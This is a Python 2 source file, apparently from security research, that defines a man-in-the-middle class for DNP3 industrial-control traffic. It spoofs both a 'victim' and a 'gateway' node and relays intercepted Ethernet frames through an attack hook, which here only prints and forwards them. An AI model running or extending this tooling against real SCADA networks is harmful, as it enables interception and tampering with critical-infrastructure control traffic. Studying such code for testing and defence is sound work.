__author__ = 'Nicholas Rodofile'

from MITM_Lib import *
from DNP3_Node import *
from DNP3_Spoof import *
from parse_config_dnp3 import *


class DNP3_MITM(MITM):
    def __init__(self, victim=None, gateway=None, verbose=1,
                 pkt_count=1, interface_selected=None):

        MITM.__init__(self, victim=victim, gateway=gateway, verbose=verbose,
                      pkt_count=pkt_count, interface_selected=interface_selected)

    def init_spoofing(self):
        self.gateway.spoofer = DNP3_Spoof(source=self.gateway, destination=self.victim, attacker=self.attacker,
                                          verbose=0)
        self.victim.spoofer = DNP3_Spoof(source=self.victim, destination=self.gateway, attacker=self.attacker,
                                         verbose=0)

    def attack_function(self, pkt):
        if self.verbose:
            print pkt.summary()
        return pkt

    def forward_packet(self, pkt):
        if pkt is None:
            return
        if pkt.haslayer(Ether):
            if pkt[Ether].dst == self.attacker.mac_address:
                if pkt[Ether].src == self.gateway.mac_address:
                    pkt = self.attack_function(pkt)
                    self.victim.spoof(pkt, self.attacker)

                elif pkt[Ether].src == self.victim.mac_address:
                    pkt = self.attack_function(pkt)
                    self.gateway.spoof(pkt, self.attacker)

                else:
                    self.error("Forward Error!: ", pkt.summary())
                    return


def DNP3_MITM_conf(interface='eth0', verbose=1, pkt_count=100):
    gateway, victim = config_nodes(interface=interface, port="20000", init_nodes_func=init_dnp3_nodes)
    return DNP3_MITM(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)

